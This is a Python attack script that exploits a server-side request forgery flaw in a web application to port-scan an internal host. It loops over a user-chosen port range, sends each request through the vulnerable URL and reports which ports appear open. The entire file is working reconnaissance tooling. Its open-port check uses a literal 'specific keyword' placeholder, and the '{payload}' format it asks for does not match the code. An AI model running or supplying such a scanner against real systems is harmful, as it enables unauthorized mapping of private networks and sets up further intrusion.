import requests
import sys

def ssrf_port_scan(target_url, target_ip, start_port, end_port):
    """
    Perform a port scan using SSRF.

    Args:
        target_url (str): The vulnerable URL with a placeholder for the SSRF payload.
        target_ip (str): The internal IP address to scan.
        start_port (int): Starting port number.
        end_port (int): Ending port number.

    Returns:
        None
    """
    open_ports = []
    closed_ports = []

    print(f"Scanning ports {start_port}-{end_port} on {target_ip} via {target_url}...\n")
    
    for port in range(start_port, end_port + 1):
        payload_url = f"http://{target_ip}:{port}"
        try:
            response = requests.get(target_url.format(payload_url), timeout=5)
            if response.status_code == 200 or "specific keyword" in response.text:
                print(f"Port {port}: OPEN")
                open_ports.append(port)
            else:
                print(f"Port {port}: CLOSED")
                closed_ports.append(port)
        except requests.exceptions.RequestException as e:
            print(f"Port {port}: ERROR ({e})")
            closed_ports.append(port)

    print("\n--- Scan Complete ---")
    print(f"Open Ports: {open_ports}")
    print(f"Closed Ports: {closed_ports}")


if __name__ == "__main__":
    try:
        # Prompt user for input
        vulnerable_url = input("Enter the vulnerable URL (with {payload} placeholder): ").strip()
        target_internal_ip = input("Enter the target internal IP: ").strip()
        start_port = int(input("Enter the starting port: ").strip())
        end_port = int(input("Enter the ending port: ").strip())

        # Validate port range
        if start_port < 1 or end_port > 65535 or start_port > end_port:
            print("Invalid port range. Ports must be between 1 and 65535, and start_port <= end_port.")
            sys.exit(1)

        # Run the scan
        ssrf_port_scan(vulnerable_url, target_internal_ip, start_port, end_port)
    except Exception as e:
        print(f"Error occurred: {e}")
        sys.exit(1)
